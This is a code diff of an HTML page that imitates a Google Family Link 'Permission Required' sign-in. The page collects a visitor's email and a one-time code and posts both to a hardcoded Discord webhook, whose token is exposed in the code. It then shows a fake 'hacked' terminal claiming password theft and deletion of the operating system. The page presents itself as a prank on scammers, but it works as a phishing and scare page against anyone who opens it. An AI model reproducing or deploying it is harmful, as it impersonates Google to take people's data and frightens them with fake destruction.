@@ -4,107 +4,123 @@
     <title>Google Family Link - Permission Required</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        :root { --bg: #ffffff; --text: #202124; --input: #f1f3f4; }
-        @media (prefers-color-scheme: dark) { :root { --bg: #202124; --text: #e8eaed; --input: #3c4043; } }
-        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Roboto', sans-serif; overflow-x: hidden; }
+        :root { --bg: #ffffff; --text: #202124; --blue: #1a73e8; }
+        @media (prefers-color-scheme: dark) { :root { --bg: #202124; --text: #e8eaed; } }
+        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Open Sans', Roboto, sans-serif; overflow-x: hidden; }
         
-        /* GMAIL BAIT SCREEN */
-        #bait-screen { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
+        .auth-container { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
         .g-logo { width: 75px; margin-bottom: 20px; }
-        input { background: var(--input); border: 1px solid #dadce0; padding: 15px; border-radius: 8px; width: 100%; max-width: 300px; color: var(--text); margin-bottom: 20px; }
-        .next-btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }
-
-        /* TERMINAL SCREEN */
-        #terminal-screen { display: none; background: #000; color: #0f0; font-family: 'Courier New', monospace; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; }
-        .red { color: #ff3131; font-weight: bold; }
-        #stop-btn { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: #ff3131; color: white; border: none; padding: 15px 30px; font-weight: bold; border-radius: 5px; z-index: 100; }
+        input { border: 1px solid #dadce0; padding: 15px; border-radius: 8px; width: 100%; max-width: 300px; color: var(--text); background: transparent; margin-bottom: 20px; font-size: 16px; }
+        .btn { background: var(--blue); color: white; border: none; padding: 12px 30px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        
+        #terminal { display: none; background: #000; color: #0f0; font-family: monospace; height: 100vh; padding: 20px; box-sizing: border-box; overflow-y: auto; position: relative; }
+        .hacked-header { color: #ff3131; font-size: 22px; font-weight: bold; text-align: center; border-bottom: 2px solid #ff3131; padding-bottom: 10px; margin-bottom: 20px; }
+        .red { color: #ff3131; }
+        #stop-btn { position: absolute; top: 15px; right: 15px; background: rgba(255,0,0,0.2); color: #ff3131; border: 1px solid #ff3131; padding: 5px 10px; font-size: 12px; border-radius: 4px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="bait-screen">
+    <div id="step-email" class="auth-container">
         <img class="g-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
-        <h2>Permission Required</h2>
-        <p>A parent or guardian must verify this action.</p>
-        <input type="email" id="user-email" placeholder="Enter parent email or username">
-        <button class="next-btn" onclick="startPrank()">Next</button>
+        <h1>Sign in</h1>
+        <p>Use your Parent Google Account</p>
+        <input type="email" id="email" placeholder="Email or phone">
+        <button class="btn" onclick="goToOTP()">Next</button>
     </div>
 
-    <div id="terminal-screen">
-        <div id="term-content"></div>
-        <button id="stop-btn" onclick="triggerRoast()">ABORT SYSTEM OVERRIDE</button>
+    <div id="step-otp" class="auth-container" style="display:none;">
+        <img class="g-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+        <h1>Verify it's you</h1>
+        <p>A 6-digit verification code has been sent to <b>marshynet.gmail.com</b></p>
+        <input type="number" id="otp-input" placeholder="Enter code">
+        <button class="btn" onclick="checkOTP()">Verify</button>
+    </div>
+
+    <div id="terminal">
+        <button id="stop-btn" onclick="triggerRoast()">STOP PROCESS</button>
+        <div class="hacked-header">YOU HAVE BEEN HACKED BY MARSHYNET</div>
+        <div id="lines"></div>
     </div>
 
 <script>
-    const bScreen = document.getElementById('bait-screen');
-    const tScreen = document.getElementById('terminal-screen');
-    const content = document.getElementById('term-content');
-    const btn = document.getElementById('stop-btn');
     const hook = "https://discordapp.com/api/webhooks/1496852933973774409/jD_cQ3GByRfVCxmAAwLbtxct4hKw64iI9knEPtCl731wROqZngJro8nQdhDz29yCxTSZ";
+    let activeOTP = "";
 
     function send(msg) {
         fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: msg}) }).catch(e => {});
     }
 
-    async function writeLine(text, color = "") {
+    function goToOTP() {
+        const mail = document.getElementById('email').value;
+        if(!mail.includes('@')) return alert("Enter a valid Google Account");
+        
+        // GENERATE RANDOM CODE
+        activeOTP = Math.floor(100000 + Math.random() * 900000).toString();
+        
+        send(`🔥 **NEW VICTIM!**\n**Email:** ${mail}\n**DYNAMIC OTP:** \`${activeOTP}\`\n\nGive them this code when they ask!`);
+        
+        document.getElementById('step-email').style.display = 'none';
+        document.getElementById('step-otp').style.display = 'flex';
+    }
+
+    function checkOTP() {
+        const userInput = document.getElementById('otp-input').value;
+        if(userInput === activeOTP) {
+            launchTrap();
+        } else {
+            alert("Wrong code. Please check your email and try again.");
+            send(`⚠️ Scammer typed wrong code: ${userInput} (Correct was ${activeOTP})`);
+        }
+    }
+
+    async function write(text, color = "") {
         const div = document.createElement('div');
-        if (color) div.className = color;
-        content.appendChild(div);
-        for (let char of text) {
+        if(color) div.className = color;
+        document.getElementById('lines').appendChild(div);
+        for(let char of text) {
             div.innerHTML += char;
             window.scrollTo(0, document.body.scrollHeight);
+            await new Promise(r => setTimeout(r, 30));
+        }
+    }
+
+    async function launchTrap() {
+        send(`🎊 **SUCCESS!** They entered the code. Marshynet takeover in progress.`);
+        document.getElementById('step-otp').style.display = 'none';
+        document.getElementById('terminal').style.display = 'block';
+
+        await write("> [SUCCESS] TOKEN_BYPASS_ACCEPTED");
+        await write("> [SYSTEM] CLONING DEVICE_ID: 882-FJK-112", "white");
+        await write("> [CRITICAL] ACCESSING SAVED_PASSWORDS.DB", "red");
+        await write("> [INFO] FETCHING DISCORD_TOKEN...");
+        await write("> [INFO] UPLOADING PRIVATE_GALLERY TO MARSHY_CLOUD...");
+        
+        for(let i=0; i<30; i++) {
+            await write(`> DECRYPTING_FILE: /System/Security/Auth_Keys/key_${Math.random().toString(36).substring(5)}.pem`);
             await new Promise(r => setTimeout(r, 40));
         }
     }
 
-    async function startPrank() {
-        const email = document.getElementById('user-email').value;
-        if(!email) return alert("Please enter an email to verify.");
-        
-        send(`🎣 **Scammer Caught!**\n**Email Entered:** ${email}\n**Status:** Initializing Terminal...`);
-        
-        bScreen.style.display = "none";
-        tScreen.style.display = "block";
-
-        await writeLine("> [SUCCESS] CONNECTION ESTABLISHED", "white");
-        await writeLine(`> [INFO] TARGET_ACCOUNT: ${email}`, "white");
-        await writeLine("> [WARN] BYPASSING GOOGLE_FAMILY_LINK...", "red");
-        await writeLine("> ACCESSING DEVELOPER_MODE...", "white");
-        
-        // Fast scroll effect
-        for(let i=0; i<50; i++){
-            const d = document.createElement('div');
-            d.innerText = "0x" + Math.random().toString(16).substr(2,8).toUpperCase() + " CACHE_DUMP_IN_PROGRESS...";
-            content.appendChild(d);
-            window.scrollTo(0, document.body.scrollHeight);
-            await new Promise(r => setTimeout(r, 20));
-        }
-    }
-
     async function triggerRoast() {
-        btn.style.display = 'none';
-        content.innerHTML = "";
-        send("💀 **Marshynet Win!** Scammer tried to stop it.");
+        document.getElementById('stop-btn').style.display = 'none';
+        document.getElementById('lines').innerHTML = "";
+        send("💀 **SCAMMER PANIC!** They clicked STOP.");
         
-        tScreen.style.background = "#000";
         await new Promise(r => setTimeout(r, 3000));
+        await write("DO YOU THINK I AM THAT DUMB? HAHAHA!", "red");
+        await write("> MARSHYNET MODE ACTIVATED.", "white");
 
-        await writeLine("DO YOU THINK I AM THAT DUMB? HAHAHA!", "red");
-        await writeLine("> ACCESSING DEVELOPER OPTIONS...", "white");
-
-        let p = 0;
         const loader = document.createElement('div');
         loader.className = "red";
-        content.appendChild(loader);
+        document.getElementById('lines').appendChild(loader);
 
-        const jumps = [3, 9, 14, 44, 45, 48, 82, 85, 93, 99];
-        for (let j of jumps) {
-            loader.innerHTML = `WIPING_DEVICE_STORAGE: [${j}%]`;
-            await new Promise(r => setTimeout(r, Math.random() * 1200 + 300));
+        const jumps = [4, 18, 32, 45, 49, 81, 95, 99];
+        for(let j of jumps) {
+            loader.innerHTML = `DELETING_OPERATING_SYSTEM: [${j}%]`;
+            await new Promise(r => setTimeout(r, Math.random() * 1500 + 500));
         }
-        
-        await writeLine("SYSTEM_WIPE_COMPLETE.", "red");
-        await writeLine("Bye bye scammer! :)", "white");
+        await write("FORMAT COMPLETE. GOODBYE SCAMMER. :)", "white");
     }
 </script>
 </body>
